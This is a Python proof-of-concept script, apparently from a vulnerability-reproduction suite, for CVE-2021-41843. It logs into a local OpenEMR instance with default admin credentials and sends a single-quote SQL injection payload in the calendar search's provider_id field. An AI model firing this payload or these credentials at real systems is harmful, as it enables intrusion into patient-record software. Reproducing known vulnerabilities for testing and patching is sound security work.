#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2021-41843 
[TYPE] SQL injection
[METHOD] POST
[CRASH_FIELDS] provider_id
[TARGET_URL] http://localhost/openemr/interface/main/calendar/index.php?module=PostCalendar&func=search
[PARAMS] pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&provider_id=1'&pc_facility=&submit=Submit
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then POST to /interface/main/calendar/index.php
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2021-41843 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/main/calendar/index.php?module=PostCalendar&func=search'
    poc_payload = {
        'pc_keywords': 'TRVNT',
        'pc_keywords_andor': 'AND',
        'pc_category': '',
        'start': '09/16/2021',
        'end': '09/23/2021',
        'provider_id': "1'",  # SQL injection payload
        'pc_facility': '',
        'submit': 'Submit'
    }
    
    # Run authenticated POC test using the helper function
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_payload,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
